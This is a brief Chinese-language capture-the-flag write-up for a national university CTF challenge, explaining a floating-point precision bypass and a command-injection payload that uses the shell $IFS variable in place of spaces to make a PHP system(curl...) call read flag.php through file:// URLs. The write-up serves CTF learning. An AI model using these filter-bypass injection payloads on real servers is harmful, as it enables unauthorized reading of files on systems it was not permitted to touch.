###此题是全国大学生CTF联赛的真题 


$num=0.9999999999999999999999999999999999999999999999  利用浮点数精度绕过



住要看 system(curl$cmd/flag);

$cmd不允许存在空格...
要读取文件,必须要构造一个空格出来,

利用Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符
echo $IFS   | od -b  

最后 $cmd=$IFS\file://$PWD/flag.php
或者 $cmd=$IFS\file:///var/www/html/exam/flag.php$IFS\


